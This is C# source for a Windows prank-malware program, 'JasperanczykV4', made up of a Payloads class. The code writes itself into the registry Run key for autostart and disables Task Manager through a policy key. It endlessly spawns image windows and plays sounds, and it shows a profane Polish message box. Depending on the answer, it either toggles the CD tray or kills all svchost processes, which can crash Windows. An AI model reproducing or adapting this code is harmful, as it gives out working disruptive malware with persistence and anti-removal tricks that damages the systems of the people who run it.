using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace JasperanczykV4
{
    internal static class Payloads
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendString(string ipstrCommand, string ipstrReturnCommand, int uReturnLength, int hwndCallback);
        public static void Start()
        {
            DisableTaskMgr();
            Thread windows = new Thread(ShowWindows);
            Thread music = new Thread(PlayMusic);
            Thread kurwa = new Thread(InsertNuclearKey);
            windows.Start();
            music.Start();
            kurwa.Start();
        }
        public static void SetAutostart()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (rk != null && rk.GetValue("JasperanczykV4") == null)
                {
                    rk.SetValue("JasperanczykV4", Application.ExecutablePath);
                }
                rk.Close();
            } catch(UnauthorizedAccessException e) 
            {
                Console.WriteLine("Jasperanczyk is not running with root privilages. Continuing anyway.");
            }
            
        }
        public static void DisableTaskMgr()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                if (rk != null && rk.GetValue("DisableTaskMgr") == null)
                {
                    rk.SetValue("DisableTaskMgr", 1);
                }
                rk.Close();
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("Jasperanczyk is not running with root privilages. Continuing anyway.");
            }
        }
        private static void ShowWindows()
        {
            Random random = new Random();
            while (true)
            {
                int indexImage = random.Next(0, images.Count - 1);
                int randWaitTime = random.Next(5000, 15000);
                int xPos = random.Next(0, Screen.PrimaryScreen.Bounds.Width/3);
                int yPos = random.Next(0, Screen.PrimaryScreen.Bounds.Height);
                string img = images[indexImage];
                new Thread(() => {
                    Application.Run(new JasperanczykV4(img, xPos, yPos));
                }).Start();
                Thread.Sleep(randWaitTime);
            }
        }
        private static void PlayMusic()
        {
            Random random = new Random();
            SoundPlayer player = new SoundPlayer();
            Console.WriteLine(music.Count);
            while (true)
            {
                int indexMusic = random.Next(0, music.Count - 1);
                player.Stream = music[indexMusic];
                player.PlaySync();
            }
        }
        private static void InsertNuclearKey()
        {
            while (true)
            {
                SoundPlayer s = new SoundPlayer(sfx[new Random().Next(0, sfx.Count - 1)]);
                s.Play();
                DialogResult dialog = MessageBox.Show("Dawid nie denerwuj sie", "KUUUURWAAAAAAAAAAAAEEEEE", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
                if (dialog == DialogResult.Yes)
                {
                    try
                    {
                        for (int i = 0; i < 10; i++)
                        {
                            int result = mciSendString("Set cdaudio door open wait", null, 0, 0);
                            Thread.Sleep(1500);
                            result = mciSendString("Set cdaudio door closed", null, 0, 0);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                } else
                {
                    try
                    {
                        Process[] processes = Process.GetProcessesByName("svchost");
                        foreach (Process process in processes)
                        {
                            process.Kill();
                        }
                    } catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                    
                }
                Thread.Sleep(new Random().Next(5000, 900000));
            }
        }

        public static readonly List<string> images = new List<string>();
        public static List<Stream> music = new List<Stream>();
        public static List<Stream> sfx = new List<Stream>();
    }
}
